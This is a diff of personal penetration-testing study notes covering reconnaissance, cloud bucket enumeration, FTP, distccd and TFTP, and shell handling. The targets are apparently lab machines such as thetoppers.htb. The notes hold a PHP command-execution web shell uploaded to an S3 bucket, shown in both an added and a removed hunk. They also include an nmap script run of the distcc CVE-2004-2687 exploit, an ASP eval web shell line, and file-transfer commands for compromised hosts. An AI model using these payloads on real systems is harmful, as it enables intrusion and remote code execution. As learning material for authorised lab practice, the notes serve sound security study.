@@ -390,6 +390,49 @@ gobuster dir -u {IP} -w {/usr/share/seclists/Discovery/Web-Content/WORDLIST}
 
 - **source code** `CRTL + U`
 
+- **StaffL**
+
+  - Employees can be identified on various business networks such as [LinkedIn](https://www.linkedin.com) or [Xing](https://www.xing.de). Job postings from companies can also tell us a lot about their  infrastructure and give us clues about what we should be looking for.
+  - Github projects from employees could reveal personal information
+
+
+### Cloud
+
+`Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) 
+
+- DNS enumeration:
+
+  Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 
+
+- Google search:
+
+- Third-party providers 
+
+  -  [domain.glass](https://domain.glass) 
+  -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
+
+#### Amazon Buckets
+
+The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..
+
+Use `awscli` to interact with them. 
+
+To list the buckets:
+`aws --endpoint=http://s3.thetoppers.htb s3 ls`
+
+To list the objects inside the buckets just specify the bucket at the end of the previous command:
+
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+```
+
+If php files are shown, it means that the bucket is handling the php page. Thus creating an appropriate php file and coping it in the bucket, will open a shell:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+```
+
 
 
 # Exploitation
@@ -429,6 +472,64 @@ Public Exploits:**
 - 2.7.1 < *Versions smaller or equal than this one  maybe only on the last digit*
 
 ##  Network
+
+### 21 FTP 
+
+**Type:** Authentication, Read/Write
+
+In an FTP connection, two channels are opened. First, the client and server establish a control channel through `TCP port 21`. The client sends commands to the server, and the server returns status  codes. Then both communication participants can establish the data  channel via `TCP port 20`. This channel is used exclusively  for data transmission, and the protocol watches for errors during this  process. If a connection is broken off during transmission, the  transport can be resumed after re-established contact.
+
+A distinction is made between `active` and `passive` FTP. In the active variant, the client establishes the connection as  described via TCP port 21 and thus informs the server via which  client-side port the server can transmit its responses. However, if a  firewall protects the client, the server cannot reply because all  external connections are blocked. For this purpose, the `passive mode` has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the  connection in this method, the firewall does not block the transfer.
+
+[List of FTP return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)
+
+**Authentication:**
+
+- Anonymous login: anonymous:anonymous
+
+**Interaction:**
+
+- `ftp`
+
+  - `cd`, `ls`, to navigate
+  - `get` `put` to download/upload
+  - `status` to check the settings
+  - `LIST -R`, if the setting ls_recurse_enable=YES, this show all the content at once.
+  - `debug`
+  - `trace`
+
+- Download all available files:
+
+  ```bash
+  wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
+  ```
+
+- If TLS/SSl wncryption is present:
+
+  ```bash
+  openssl s_client -connect [IP] -starttls ftp
+  ```
+
+  This will also show the SSL certificate
+
+- netcat/telnet
+
+**Exploit:**
+
+- File upload
+  - LFI
+  - with web servers, it is common that files are synchronized
+
+- sniffing with tcpdump could be possible
+- If the user are shown (i.e. the setting `hide_ids`, which makes all user and group information in directory listings will be displayed as "ftp", is set on NO)
+
+**vsFTPd Configuration**
+
+- The default configuration of vsFTPd can be found in `/etc/vsftpd.conf`
+- Possible settings: [man page](http://vsftpd.beasts.org/vsftpd_conf.html).
+- `/etc/ftpusers` is used to deny certain users access to the FTP service.
+
+
 
 ### RDP 3389
 
@@ -480,11 +581,7 @@ Once inside redis environment `info` return information about the  server
 
 -  `mssqlclient.py [[domain/]username[:password]@]<targetName or address> -windows-auth`
 
-### FTP 21
 
-**Type:** authentication
-
- `ftp`
 
 ### SMB 445
 
@@ -501,19 +598,35 @@ Once inside redis environment `info` return information about the  server
 
 - To copy: `rsync -av rsync://{HOST}/{module} [YOUR DIRECTORY]`
 
+### 3632 distccd
+
+**Distcc** is a tool that enhances the **compilation process** by utilizing the **idle processing power** of other computers in the network. When **distcc** is set up on a machine, this machine is capable of distributing its **compilation tasks** to another system. This recipient system must be running the **distccd daemon** and must have a **compatible compiler** installed to process the sent code.
+
+Check if it's vulnerable to **CVE-2004-2687** to execute arbitrary code:
+
+```bash
+nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
+```
 
 ### TFTP UPD 69
 
 **Type: ** Read/write
 
-It allows file transfers without needing authentication.
+Like FTP, but without needing authentication.
 
 ```
 tftp
 >
 ```
 
-
+| **Commands** | **Description**                                              |
+| ------------ | ------------------------------------------------------------ |
+| `connect`    | Sets the remote host, and optionally the port, for file transfers. |
+| `get`        | Transfers a file or set of files from the remote host to the local host. |
+| `put`        | Transfers a file or set of files from the local host onto the remote host. |
+| `quit`       | Exits tftp.                                                  |
+| `status`     | Shows the current status of tftp, including the current transfer  mode (ascii or binary), connection status, time-out value, and so on. |
+| `verbose`    | Turns verbose mode, which displays additional information during file transfer, on or off. |
 
 ## Web
 
@@ -565,28 +678,6 @@ Parameters are very important to spot, and they are grouped in different categor
 
 `paramfuzz(query_url)` to fuzz get parameters
 
-### Amazon Buckets (to place)
-
-The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..
-
-Use `awscli` to interact with them. 
-
-To list the buckets:
-`aws --endpoint=http://s3.thetoppers.htb s3 ls`
-
-To list the objects inside the buckets just specify the bucket at the end of the previous command:
-
-```bash
-aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
-```
-
-If php files are shown, it means that the bucket is handling the php page. Thus creating an appropriate php file and coping it in the bucket, will open a shell:
-
-```bash
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
-```
-
 
 
 ### Proxy
@@ -602,8 +693,6 @@ gobuster vhost -u http://[DOMAIN] -w /usr/share/seclists/Discovery/DNS/subdomain
 ```
 
 Ignore any 400 Status output, since it means that the proxy refused your request.
-
-
 
 ### Server-side Injections
 
@@ -731,6 +820,14 @@ Once we connect to a shell through Netcat, we will notice that we can  only type
 
 It could happen that the history of the shell is empty if the upgrade is not performed, and the history could contain important information, such as passwords.
 
+### General method
+
+```bash
+script -qc /bin/bash /dev/null
+```
+
+
+
 ### python/stty method
 
 ```bash
@@ -773,7 +870,9 @@ A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our
 <% eval request("cmd") %>
 ```
 
+## MSFVenom
 
+Get the shell from `msfconsole`, which is recommended for windows, use also the right listener from `msfconsole`
 
 ### Uploading a Web Shell
 
@@ -952,18 +1051,30 @@ ssh root@10.10.10.10 -i key	# Login
 
 
 
-# Linux General
+# General Knowledge
 
-## Transferring Files
+## Transferring files
 
-### wget/cURL to upload
+**wget/cURL to upload**
 
 - On my machine, go on the directory containing the file in interest
 
-- Run python Server in it
+- Run a server in it
 
   ```bash
   python3 -m http.server 8000	
+  ```
+
+  If the machine is very old it could be that the python server won't work. In this case for Windows one can use smb and host the current folder (if not specifies instead of `.`):
+
+  ```bash
+  smbsrver.py -ip [YOUR IP] share .
+  ```
+
+  Remotely you connect by:
+
+  ```
+  copy \\[YOUR IP]\share\[FILE] [OUTPUT_FILE]
   ```
 
 - Download remotely
@@ -972,7 +1083,7 @@ ssh root@10.10.10.10 -i key	# Login
   curl [URL] -o [FILE_NAME]
   ```
 
-### SCP
+**SCP**
 
 If we have ssh credentials:
 
@@ -980,7 +1091,7 @@ If we have ssh credentials:
 scp [FILE_NAME] user@remotehost:[FILE_PATH]
 ```
 
-### Base64
+**Base64**
 
 In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from  downloading a file from our machine. 
 
@@ -1000,8 +1111,15 @@ base64 [FILE_NAME] -w 0
   echo [STRING] | base64 -d > [FILE_NAME]
   ```
 
-### Validate Transfer
+**Validate Transfer**
 
 `file`: validates the format of a file
 
 `md5sum` validates the hash of the filestomi
+
+## Windows
+
+## Google search
+
+- `intext:*term*` restricts results to documents containing *`term`* in the text. 
+-  `inurl:` in your query, Google will restrict the results to documents containing that word in the URL.
